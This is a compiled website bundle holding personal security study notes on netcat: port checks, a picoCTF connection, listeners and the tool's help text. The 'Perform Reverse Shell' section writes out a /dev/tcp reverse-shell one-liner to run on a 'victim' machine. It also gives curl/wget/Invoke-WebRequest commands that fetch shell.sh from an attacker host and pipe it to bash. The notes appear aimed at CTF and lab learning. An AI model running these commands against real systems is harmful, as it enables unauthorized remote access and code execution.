"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[8061],{4137:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>h});var r=t(7294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function l(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var c=r.createContext({}),i=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):l(l({},n),e)),t},p=function(e){var n=i(e.components);return r.createElement(c.Provider,{value:n},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},d=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,a=e.originalType,c=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),u=i(t),d=o,h=u["".concat(c,".").concat(d)]||u[d]||m[d]||a;return t?r.createElement(h,l(l({ref:n},p),{},{components:t})):r.createElement(h,l({ref:n},p))}));function h(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var a=t.length,l=new Array(a);l[0]=d;var s={};for(var c in n)hasOwnProperty.call(n,c)&&(s[c]=n[c]);s.originalType=e,s[u]="string"==typeof e?e:o,l[1]=s;for(var i=2;i<a;i++)l[i]=t[i];return r.createElement.apply(null,l)}return r.createElement.apply(null,t)}d.displayName="MDXCreateElement"},9383:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>l,default:()=>m,frontMatter:()=>a,metadata:()=>s,toc:()=>i});var r=t(7462),o=(t(7294),t(4137));const a={},l="[Connection] Netcat",s={unversionedId:"notes/Security/Networking/[Connection]_netcat",id:"notes/Security/Networking/[Connection]_netcat",title:"[Connection] Netcat",description:"Check target port avaiable",source:"@site/docs/notes/Security/Networking/[Connection]_netcat.mdx",sourceDirName:"notes/Security/Networking",slug:"/notes/Security/Networking/[Connection]_netcat",permalink:"/docs/notes/Security/Networking/[Connection]_netcat",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"notes",previous:{title:"[Img] jsteg",permalink:"/docs/notes/Security/Forensics/[Img]_jsteg"},next:{title:"[Scan] Nmap",permalink:"/docs/notes/Security/Networking/[Scan]_nmap"}},c={},i=[{value:"Check target port avaiable",id:"check-target-port-avaiable",level:2},{value:"Check connections",id:"check-connections",level:2},{value:"Open current port",id:"open-current-port",level:2},{value:"Perform Reverse Shell",id:"perform-reverse-shell",level:2},{value:"Overall help",id:"overall-help",level:2}],p={toc:i},u="wrapper";function m(e){let{components:n,...t}=e;return(0,o.kt)(u,(0,r.Z)({},p,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"connection-netcat"},"[Connection]"," Netcat"),(0,o.kt)("h2",{id:"check-target-port-avaiable"},"Check target port avaiable"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -nv 192.168.0.12 8080\n\nnc -nv -w 3 192.168.0.12 8080 # Faster die time if target not open\n")),(0,o.kt)("h2",{id:"check-connections"},"Check connections"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc jupiter.challenges.picoctf.org 64287\n")),(0,o.kt)("h2",{id:"open-current-port"},"Open current port"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -lvnp 8080\n")),(0,o.kt)("h2",{id:"perform-reverse-shell"},"Perform Reverse Shell"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://www.revshells.com/"},"https://www.revshells.com/")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"In your machine, run the nc listener, assume you are open port ",(0,o.kt)("inlineCode",{parentName:"li"},"8080"))),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -lvnp 8080\n")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"In victims machine, run the target code and done")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"sh -i >& /dev/tcp/192.168.80.105/8080 0>&1\n")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"(Optional) In case, you may use ",(0,o.kt)("inlineCode",{parentName:"li"},"python")," or npm ",(0,o.kt)("inlineCode",{parentName:"li"},"serve")," to host a simple web server")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"python3 -m http.server 8080\n\nserve -p 8080\n")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"(Optional) In victim machine, use ",(0,o.kt)("inlineCode",{parentName:"li"},"wget"),", ",(0,o.kt)("inlineCode",{parentName:"li"},"curl")," or ",(0,o.kt)("inlineCode",{parentName:"li"},"Invoke-WebRequest"))),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"wget http://172.31.206.223:8080/shell.sh\ncurl http://172.31.206.223:8080/shell.sh\n\ncurl%20http://172.31.206.223:8080/shell.sh|bash\n\nInvoke-WebRequest http://172.31.206.223:8080/shell.sh -OutFile shell.sh | bash shell.sh\n")),(0,o.kt)("h2",{id:"overall-help"},"Overall help"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-md"},"[v1.10-47]\nconnect to somewhere:   nc [-options] hostname port[s] [ports] ...\nlisten for inbound:     nc -l -p port [-options] [hostname] [port]\noptions:\n        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]\n        -e filename             program to exec after connect [dangerous!!]\n        -b                      allow broadcasts\n        -g gateway              source-routing hop point[s], up to 8\n        -G num                  source-routing pointer: 4, 8, 12, ...\n        -h                      this cruft\n        -i secs                 delay interval for lines sent, ports scanned\n        -k                      set keepalive option on socket\n        -l                      listen mode, for inbound connects\n        -n                      numeric-only IP addresses, no DNS\n        -o file                 hex dump of traffic\n        -p port                 local port number\n        -r                      randomize local and remote ports\n        -q secs                 quit after EOF on stdin and delay of secs\n        -s addr                 local source address\n        -T tos                  set Type Of Service\n        -t                      answer TELNET negotiation\n        -u                      UDP mode\n        -v                      verbose [use twice to be more verbose]\n        -w secs                 timeout for connects and final net reads\n        -C                      Send CRLF as line-ending\n        -z                      zero-I/O mode [used for scanning]\nport numbers can be individual or ranges: lo-hi [inclusive];\nhyphens in port names must be backslash escaped (e.g. 'ftp\\-data').\n")))}m.isMDXComponent=!0}}]);